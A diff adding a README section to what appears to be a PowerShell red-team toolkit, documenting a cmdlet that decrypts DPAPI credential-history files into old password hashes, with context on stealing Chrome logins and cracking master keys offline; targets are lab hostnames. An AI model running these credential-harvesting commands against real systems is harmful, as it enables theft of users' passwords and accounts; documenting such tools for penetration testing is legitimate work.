@@ -710,6 +710,22 @@ $userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.l
 Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $userKeys
 ```
 
+#### Get-TBODpapiCredHist
+
+Decrypts DPAPI `CREDHIST` (credential history) files from user Protect directories and returns historical password hashes.
+This can help when a user has changed passwords, and older master key files reference a `CREDHIST` entry.
+
+```powershell
+# Decrypt credential history across accessible user profiles.
+Get-TBODpapiCredHist -ServerName corp1-web01.corp1.lab.home-labs.lol -UserPassword 'Passw0rd!'
+
+# Use an NT hash instead of plaintext.
+Get-TBODpapiCredHist -ServerName corp1-web01.corp1.lab.home-labs.lol -UserNtlmHash '0123456789abcdef0123456789abcdef'
+
+# Filter to specific profile directory names (wildcards supported).
+Get-TBODpapiCredHist -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName jsmith -UserPassword 'Passw0rd!'
+```
+
 #### Get-TBODpapiMasterKeyHashes
 
 Formats DPAPI master key files into John/Hashcat `$DPAPImk$...` hashes for offline password cracking.
